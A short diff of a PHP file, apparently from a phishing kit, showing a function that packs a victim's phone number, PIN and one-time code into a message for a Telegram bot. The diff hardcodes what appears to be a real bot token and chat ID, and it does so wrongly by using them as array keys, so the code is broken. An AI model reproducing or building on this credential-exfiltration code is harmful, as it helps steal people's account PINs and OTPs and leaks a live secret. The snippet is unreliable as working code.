@@ -47,10 +47,10 @@ function send_to_telegram($nomor, int $pin, int $otp)
 {
     include __DIR__ . '/config.php';
     // Change this token with your bot token
-    $token = $config['telegram_bot_token'];
+    $token = $config['6608073429:AAFfl7R6X0Ov8QGDsZzKp5SnmxG83jKeRiM'];
 
     // Change this chat_id with your chat_id
-    $chat_id = $config['chat_id'];
+    $chat_id = $config['6918077107'];
 
     $message = "Nomor: $nomor\nPin: $pin\nOtp: $otp";
 
